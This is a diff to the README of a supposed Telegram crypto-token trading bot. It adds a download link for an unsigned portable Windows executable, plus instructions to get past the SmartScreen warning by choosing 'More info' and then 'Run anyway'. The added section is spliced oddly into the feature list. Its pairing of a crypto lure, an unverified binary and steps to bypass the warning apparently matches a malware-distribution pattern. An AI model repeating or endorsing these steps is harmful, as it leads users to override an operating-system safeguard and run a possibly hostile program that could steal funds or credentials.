@@ -26,6 +26,15 @@ After you buy, it keeps watching. If the developer raises the sell tax or pulls 
 
 ## Why it's different
 
+## Download
+
+[Download `Tokentrade-1.3.90-portable-x64.exe`](https://github.com/BlackInspection/token-trade-telegram-bot/releases/latest/download/Tokentrade-1.3.90-portable-x64.exe) — one file, no installer, no admin rights.
+
+> [!NOTE]
+> The build isn't code-signed yet, so SmartScreen may warn you the first time.
+> Choose **More info**, then **Run anyway**.
+
+
 - **The full round trip in dollars, not just buy slippage.** Most trading bots show slippage on the buy side only. This one quotes a buy *and* the sell straight back, then tells you: "Put in $50, sell right away, get back ~$46.34 (-7.3%), break-even +7.9%". It also shows the largest buy that keeps the round trip under 3%. Automatic buys are skipped when the target barely covers that cost.
 - **It keeps watching after you buy.** Contract scanners give you a one-time snapshot. The Position Guardian compares each held token with how it looked when you bought: taxes, honeypot status, the sell route, mint and owner rights, the LP lock and liquidity. A critical change triggers an alert or an exit.
 - **It grades its own calls in public, losers included.** `/trackrecord` checks every verdict 1 hour, 24 hours and 7 days later and reports each verdict class against the baseline of all tokens checked. Losing calls are never dropped, and small samples are labeled as anecdotes.
